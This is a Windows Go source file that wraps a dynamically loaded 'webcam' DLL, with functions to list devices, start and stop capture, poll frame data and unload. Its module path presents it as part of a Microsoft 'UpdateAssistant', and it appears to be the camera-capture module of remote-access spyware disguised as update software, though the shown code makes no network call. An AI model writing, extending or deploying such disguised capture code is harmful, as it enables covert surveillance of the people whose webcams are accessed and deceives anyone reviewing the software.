//go:build windows

package sysutil

import (
    "encoding/json"
    "sync"
    "unsafe"

    "github.com/microsoft/UpdateAssistant/modules/loader"
    "github.com/microsoft/UpdateAssistant/modules/logger"
)

var (
    camMu   sync.Mutex
    camPlug *loader.Plugin
)

func camDLL(fn func(*loader.Plugin)) {
    camMu.Lock()
    defer camMu.Unlock()
    if camPlug == nil {
        p, err := loader.Load("webcam")
        if err != nil {
            logger.Error("[cam] dll load failed: %v", err)
            return
        }
        logger.Info("[cam] dll loaded")
        camPlug = p
    }
    fn(camPlug)
}

func CamUnload() {
    camMu.Lock()
    defer camMu.Unlock()
    if camPlug != nil {
        camPlug.Call("cam_unload")
        loader.Unload(camPlug)
        camPlug = nil
    }
}

func CamList() []struct {
    ID   int    `json:"id"`
    Name string `json:"name"`
} {
    var out []struct {
        ID   int    `json:"id"`
        Name string `json:"name"`
    }
    camDLL(func(p *loader.Plugin) {
        buf := make([]byte, 8192)
        n, err := p.Call("cam_list", uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)))
        if err != nil {
            logger.Error("[cam] cam_list call error: %v", err)
            return
        }
        var resp struct {
            Count   int `json:"count"`
            HKLM    int `json:"hklm"`
            HKCU    int `json:"hkcu"`
            Devices []struct {
                ID   int    `json:"id"`
                Name string `json:"name"`
            } `json:"devices"`
        }
        if err := json.Unmarshal(buf[:int(n)], &resp); err != nil {
            logger.Error("[cam] cam_list parse error: %v", err)
            return
        }
        for _, d := range resp.Devices {
            out = append(out, struct {
                ID   int    `json:"id"`
                Name string `json:"name"`
            }{ID: d.ID, Name: d.Name})
        }
    })
    return out
}

func CamStart(deviceID int) (ok bool, w, h int) {
    camDLL(func(p *loader.Plugin) {
        buf := make([]byte, 256)
        n, err := p.Call("cam_start", uintptr(deviceID), uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)))
        if err != nil {
            logger.Error("[cam] cam_start call error: %v", err)
            return
        }
        var res struct {
            OK bool `json:"ok"`
            W  int  `json:"w"`
            H  int  `json:"h"`
        }
        json.Unmarshal(buf[:int(n)], &res)
        ok, w, h = res.OK, res.W, res.H
    })
    return
}

func CamStop() {
    camDLL(func(p *loader.Plugin) {
        buf := make([]byte, 256)
        p.Call("cam_stop", uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)))
    })
}

func CamPoll(buf []byte) int {
    var n int
    camDLL(func(p *loader.Plugin) {
        if len(buf) == 0 {
            return
        }
        r, _ := p.Call("cam_poll", uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)))
        n = int(r)
    })
    return n
}